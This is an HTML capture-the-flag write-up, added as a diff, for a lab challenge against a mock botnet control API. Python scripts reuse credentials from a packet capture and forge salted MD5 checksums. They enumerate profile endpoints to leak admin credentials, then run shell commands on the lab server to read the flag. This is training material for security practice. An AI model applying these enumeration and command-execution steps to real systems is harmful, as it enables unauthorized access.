@@ -1,0 +1,215 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>writeup</title>
+  <link rel="stylesheet" href="https://stackedit.io/style.css" />
+</head>
+
+<body class="stackedit">
+  <div class="stackedit__html"><h1 id="c2-api---misc-500">C2 API - Misc 500</h1>
+<blockquote>
+<p>pnill: Did you ever run the old c2 bot?<br>
+kyle: yes and it told me not to run untrusted code, whatever mom<br>
+pnill: it was supposed to execute shutdown -t 0 after saying that…</p>
+</blockquote>
+<h2 id="challenge-description">Challenge Description</h2>
+<p>So we managed to capture traffic off the attackers network once again, and this time we think we found their actual C2 API… previously everything we’d looked at didn’t seem to really have anything to do with their bot setup, can you do anything with it we’ve attached the capture we managed to grab as well.</p>
+<p>Good luck.</p>
+<p><a href="http://172.18.10.105:31305">http://172.18.10.105:31305</a></p>
+<p>Challenge also included <code>challenge1.pcap</code></p>
+<h2 id="initial-observations">Initial Observations</h2>
+<p>Looking through the pcap file we can see quite a few TCP streams, over 2000 in fact. It looks like the pcap shows something interacting with an API. The first TCP stream includes a user name and password <code>user:mysup3rP@ssw0rd!!</code>. We can also see that each request requires a uri_checksum parameter.<br>
+Using Wireshark (Statistics -&gt; HTTP -&gt; Requests) we can print a summary of all of the endpoints hit in the pcap.</p>
+<p>/api/update_bots<br>
+/api/start_ddos<br>
+/api/send_botcmd<br>
+/api/salt<br>
+/api/request_uri<br>
+/api/profile_update<br>
+/api/profile/4<br>
+/api/profile/3<br>
+/api/profile/2<br>
+/api/phpinfo<br>
+/api/download_c2_app<br>
+/api/comment_responses<br>
+/api/comment<br>
+/api/c2_log<br>
+/api/bot_sendkeylogs<br>
+/api/authenticate</p>
+<p>By filtering the <code>/api/comment</code> and <code>/api/comment_response</code> endpoints we can find some interesting information.</p>
+<blockquote>
+<p>Hey Admin, I tried to download the C2 app and execute against the command to my bots but it didn’t work… it told me I needed to be admin what gives?</p>
+</blockquote>
+<blockquote>
+<p>User: You’re executing the wrong command, that one is only for admins to execute commands against the C2 SERVER! PLEASE DONT USE THAT COMMAND!, Not that you could cause you’re just a user… the command you want to execute commands against your bots is actually send_botcmd thanks. I guess we mistakenly left the C2 CMD command in the app!</p>
+</blockquote>
+<blockquote>
+<p>Admins!, I had to update h4x0rb0t so please download the new one from /api/download_c2_app make sure you’re authenticated and have the correct key set in the key parameter some user was trying to execute commands against C2 CMD and there’s still that bug in the API where they could steal admin credentials so we probably want to remove that C2 CMD in the next iteration of the API! I told them they can’t do anything though because they’re not admin… I hope they don’t figure it out because then they’ll be able to compromise our C2! Lets get this updated fast!</p>
+</blockquote>
+<blockquote>
+<p>Admins!, I made a new secure method for accessing URIs since the last one was broken by someone modifying our URLs after capturing traffic from the C2 Desktop App, now all URLs are hashed using a salt the new hash generation method is a md5 of the uri salted by the generated salt make sure you update your scripts with this!!</p>
+</blockquote>
+<p>This gives us some helpful clues. Before we authenticate we should get a salt from <code>/api/salt</code> When we authenticate (using the creds for user from the pcap) we will get a salt that we use to hash the urls. We can also pull an old version of the botnet, but the comments suggest that it was updated so we should try and pull the new one.</p>
+<h2 id="interacting-with-the-server">Interacting with the Server</h2>
+<p>Python has the requests library which will handle the cookies for us. We can quickly write up a script to log in as user and pull user’s key.</p>
+<pre class=" language-python"><code class="prism  language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> json
+<span class="token keyword">import</span> hashlib
+
+host <span class="token operator">=</span> <span class="token string">"http://172.18.10.105:31305"</span>
+session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">doPost</span><span class="token punctuation">(</span>api<span class="token punctuation">,</span>salt<span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+  data<span class="token punctuation">[</span><span class="token string">'uri_checksum'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">(</span>salt<span class="token operator">+</span>api<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
+  <span class="token keyword">return</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>host<span class="token operator">+</span>api<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+salt_res<span class="token operator">=</span>doPost<span class="token punctuation">(</span><span class="token string">"/api/salt"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>
+salt<span class="token operator">=</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>salt_res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"response"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"salt"</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>F<span class="token string">"Salt: {salt}"</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Login:"</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>doPost<span class="token punctuation">(</span><span class="token string">"/api/authenticate"</span><span class="token punctuation">,</span>salt<span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"mysup3rP@ssw0rd!!"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+key <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>doPost<span class="token punctuation">(</span><span class="token string">"/api/profile/2"</span><span class="token punctuation">,</span>salt<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"response"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"key"</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>F<span class="token string">"Key: {key}"</span><span class="token punctuation">)</span>
+
+</code></pre>
+<p>We can use this key to request a new copy of the botnet at the <code>/api/download_c2_app</code> endpoint. Once we do we have to crack the zip password with John the Ripper or Hashcat. The application inside is an ARM executable made with the Xojo Framework. Because it’s a proprietary framework there aren’t many resources available to help reverse it, but we can start by greping the strings for hidden api endpoints.</p>
+<pre><code>strings h4x0rBot2.0 | grep api
+OpenGL.glGetMapiv(target As Integer, query As Integer, v As MemoryBlock)
+http://soapinterop.org/xsd
+#http://172.18.10.105:31305/api/salt
+/api/authenticate
++http://172.18.10.105:31305/api/authenticate
+/api/c2_cmd
+/api/profile_update
+-http://172.18.10.105:31305/api/profile_update
+/api/send_botcmd
+*http://172.18.10.105:31305/api/send_botcmd
+/api/update_bots
+*http://172.18.10.105:31305/api/update_bots
+/api/request_uri
+*http://172.18.10.105:31305/api/request_uri
+%http://172.18.10.105:31305/api/c2_cmd
+/api/start_ddos
+)http://172.18.10.105:31305/api/start_ddos
+/api/bot_sendkeylogs
+.http://172.18.10.105:31305/api/bot_sendkeylogs
+</code></pre>
+<p><code>/api/c2_cmd</code> wasn’t in the original pcap, let’s try to hit it.</p>
+<p><code>{"response":"you need admin to do that!"}</code></p>
+<p>Now we need an admin’s creds. Grepping the botnet doesn’t lead to any results, before we try reversing let’s try hitting the <code>/api/profile/#</code> endpoints to see if there are more users we can enumerate.</p>
+<pre class=" language-python"><code class="prism  language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> json
+<span class="token keyword">import</span> hashlib
+
+host <span class="token operator">=</span> <span class="token string">"http://172.18.10.105:31305"</span>
+session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">doPost</span><span class="token punctuation">(</span>api<span class="token punctuation">,</span>salt<span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+  data<span class="token punctuation">[</span><span class="token string">'uri_checksum'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">(</span>salt<span class="token operator">+</span>api<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
+  <span class="token keyword">return</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>host<span class="token operator">+</span>api<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+salt_res<span class="token operator">=</span>doPost<span class="token punctuation">(</span><span class="token string">"/api/salt"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>
+salt<span class="token operator">=</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>salt_res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"response"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"salt"</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>F<span class="token string">"Salt: {salt}"</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Login:"</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>doPost<span class="token punctuation">(</span><span class="token string">"/api/authenticate"</span><span class="token punctuation">,</span>salt<span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"mysup3rP@ssw0rd!!"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+key <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>doPost<span class="token punctuation">(</span><span class="token string">"/api/profile/2"</span><span class="token punctuation">,</span>salt<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"response"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"key"</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>F<span class="token string">"Key: {key}"</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>doPost<span class="token punctuation">(</span><span class="token string">"/api/c2_cmd"</span><span class="token punctuation">,</span>salt<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+  <span class="token keyword">print</span><span class="token punctuation">(</span>doPost<span class="token punctuation">(</span>F<span class="token string">"/api/profile/{i}"</span><span class="token punctuation">,</span>salt<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+</code></pre>
+<pre><code>python3.8 test.py
+Salt: 9^25wPc1S4XwK=e+Z_8'*=YtN"SAN|4|Y9+}AuC}3Li*JfVo^YjSk(W
+Login:
+{"response":{"status":"ok"}}
+Key: c03713f2e5d39653322d3259202ed45d
+{"response":"you need admin to do that!"}
+{"response":null}
+{"response":{"username":"admin","password":"mysup3rs3cr3tP@ssw0rd!!!!","key":"415290769594460e2e485922904f345d"}}
+{"response":{"username":"user","password":"mysup3rP@ssw0rd!!","key":"c03713f2e5d39653322d3259202ed45d"}}
+{"response":null}
+{"response":null}
+{"response":null}
+{"response":null}
+{"response":null}
+{"response":null}
+{"response":null}
+</code></pre>
+<p>Admin creds have been leaked. Now let’s login as admin and try running c2_cmd. We’ll have to also pass the admin’s key into the c2_cmd api. Nothing is happening so there must be one more missing piece. At this point lets look around the area in the binary where the c2_cmd endpoint was found. It’s possible that nearby strings will tell us the syntax. This time instead of grep we’ll open the binary in a hex editor.</p>
+<p><img src="images/screen1.png" alt="Screenshot of HxD with c2_cmd searched"></p>
+<p>Nearby we can see the strings <code>ls -la</code> and <code>cmd</code>, so let’s try adding <code>'cmd':'ls -la'</code> to our request.</p>
+<pre class=" language-python"><code class="prism  language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> json
+<span class="token keyword">import</span> hashlib
+
+host <span class="token operator">=</span> <span class="token string">"http://172.18.10.105:31305"</span>
+session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">doPost</span><span class="token punctuation">(</span>api<span class="token punctuation">,</span>salt<span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+  data<span class="token punctuation">[</span><span class="token string">'uri_checksum'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">(</span>salt<span class="token operator">+</span>api<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
+  <span class="token keyword">return</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>host<span class="token operator">+</span>api<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+salt_res<span class="token operator">=</span>doPost<span class="token punctuation">(</span><span class="token string">"/api/salt"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get_dict<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>F<span class="token string">"Salt Res: {salt_res.text}"</span><span class="token punctuation">)</span>
+salt<span class="token operator">=</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>salt_res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"response"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"salt"</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>F<span class="token string">"Salt: {salt}"</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Login:"</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>doPost<span class="token punctuation">(</span><span class="token string">"/api/authenticate"</span><span class="token punctuation">,</span>salt<span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"mysup3rs3cr3tP@ssw0rd!!!!"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+key <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>doPost<span class="token punctuation">(</span><span class="token string">"/api/profile/1"</span><span class="token punctuation">,</span>salt<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"response"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"key"</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>F<span class="token string">"Key: {key}"</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>doPost<span class="token punctuation">(</span><span class="token string">"/api/c2_cmd"</span><span class="token punctuation">,</span>salt<span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"key"</span><span class="token punctuation">:</span>key<span class="token punctuation">,</span><span class="token string">"cmd"</span><span class="token punctuation">:</span><span class="token string">"ls -la"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+</code></pre>
+<pre><code>python3.8 test.py
+{'PHPSESSID': 'urp72qgm66nv8o8r6suc2d5jh0'}
+Salt Res: {"response":{"salt":"=MZS&amp;^Dae]6WY'MoC|M7&gt;mQlG\\i84J-Ff&gt;92d)\"uTimp.iedk&amp;sMyBo"}}
+Salt: =MZS&amp;^Dae]6WY'MoC|M7&gt;mQlG\i84J-Ff&gt;92d)"uTimp.iedk&amp;sMyBo
+Login:
+{"response":{"status":"ok"}}
+Key: 415290769594460e2e485922904f345d
+total 26916
+drwxr-xr-x 2 nobody nogroup     4096 Sep  4 01:44 .
+drwxr-xr-x 4 nobody nogroup     4096 Sep  4 01:45 ..
+-rwxrwxr-x 1 nobody nogroup 15255811 Sep  4 01:42 h4x0rBot2.zip
+-rwxrwxr-x 1 nobody nogroup 12289640 Sep  3 17:46 h4x0rb0t.zip
+-rwxrwxr-x 1 nobody nogroup     3726 Sep  4 01:44 index.php
+</code></pre>
+<p>Aha, we have access to a shell on the API server. Let’s run <code>ls -la /</code></p>
+<pre><code>total 68
+drwxr-xr-x   19 nobody nogroup 4096 Sep  4 01:45 .
+drwxr-xr-x   19 nobody nogroup 4096 Sep  4 01:45 ..
+lrwxrwxrwx    1 nobody nogroup    7 Jun  9 07:27 bin -&gt; usr/bin
+drwxr-xr-x    2 nobody nogroup 4096 Apr 15  2020 boot
+drwxr-xr-x    5 nobody nogroup  360 Sep  4 01:46 dev
+drwxr-xr-x   49 nobody nogroup 4096 Jun 21 18:05 etc
+-rw-r--r--    1 nobody nogroup   47 Sep  4 01:43 flag
+drwxr-xr-x    2 nobody nogroup 4096 Apr 15  2020 home
+lrwxrwxrwx    1 nobody nogroup    7 Jun  9 07:27 lib -&gt; usr/lib
+lrwxrwxrwx    1 nobody nogroup    9 Jun  9 07:27 lib32 -&gt; usr/lib32
+lrwxrwxrwx    1 nobody nogroup    9 Jun  9 07:27 lib64 -&gt; usr/lib64
+lrwxrwxrwx    1 nobody nogroup   10 Jun  9 07:27 libx32 -&gt; usr/libx32
+drwxr-xr-x    2 nobody nogroup 4096 Jun  9 07:27 media
+drwxr-xr-x    2 nobody nogroup 4096 Jun  9 07:27 mnt
+drwxr-xr-x    2 nobody nogroup 4096 Jun  9 07:27 opt
+dr-xr-xr-x 1103 nobody nogroup    0 Sep 22 07:27 proc
+drwx------    2 nobody nogroup 4096 Jun  9 07:31 root
+drwxr-xr-x    8 nobody nogroup 4096 Jun 21 18:04 run
+lrwxrwxrwx    1 nobody nogroup    8 Jun  9 07:27 sbin -&gt; usr/sbin
+drwxr-xr-x    2 nobody nogroup 4096 Jun  9 07:27 srv
+drwxr-xr-x    2 nobody nogroup 4096 Apr 15  2020 sys
+drwxrwxrwt    2 user   user      40 Sep 22 07:27 tmp
+drwxr-xr-x   14 nobody nogroup 4096 Jun 21 18:04 usr
+drwxr-xr-x   11 nobody nogroup 4096 Jun  9 07:31 var
+drwxr-xr-x    4 nobody nogroup 4096 Sep  4 01:45 web-apps
+drwxr-xr-x    2 nobody nogroup 4096 Sep  4 01:45 web-servers
+</code></pre>
+<p>There’s the flag, now just run <code>cat /flag</code> to output the flag.</p>
+<p><code>RTXFLAG{h4d_fun_tr0lling_y0u_0n_th1s_c0ngr4tz}</code></p>
+</div>
+</body>
+
+</html>
